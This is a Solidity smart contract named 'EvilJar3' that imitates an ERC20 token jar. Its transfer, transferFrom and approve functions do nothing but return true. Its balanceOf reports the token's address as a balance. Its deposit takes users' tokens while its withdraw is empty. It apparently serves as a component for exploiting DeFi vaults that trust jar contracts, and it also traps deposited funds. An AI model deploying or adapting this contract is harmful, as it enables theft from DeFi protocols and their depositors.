pragma solidity^0.6.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract EvilJar3 {

    address owner;
    IERC20 public token;
    uint public constant getRatio = 1;
    
    constructor(address _token) public {
        owner = msg.sender;
        token = IERC20(_token);
    }

    function deposit(uint amt) public {
        token.transferFrom(msg.sender, address(this), amt);
    }

    function transferFrom(address src, address dst, uint amt) public returns (bool) {
        return true;
    }

    function transfer(address dst, uint amt) public returns (bool) {
        return true;
    }

    function approve(address dst, uint amt) public returns (bool) {
        return true;
    }

    function allowance(address src, address dst) public view returns (uint) {
        return 0;
    }

    function balanceOf(address src) public view returns (uint) {
        // return IERC20(token).balanceOf(src);
        // require(false, "balance of reached");
        return uint(address(token));
        // return IERC20(token).balanceOf(msg.sender);
    }

    function decimals() public view returns (uint8) {
        return 0;
    }

    function withdraw(uint amt) public {
        // if (msg.sender == owner) {
        //     token.transfer(msg.sender, token.balanceOf(address(this)));
        // }
    }
}
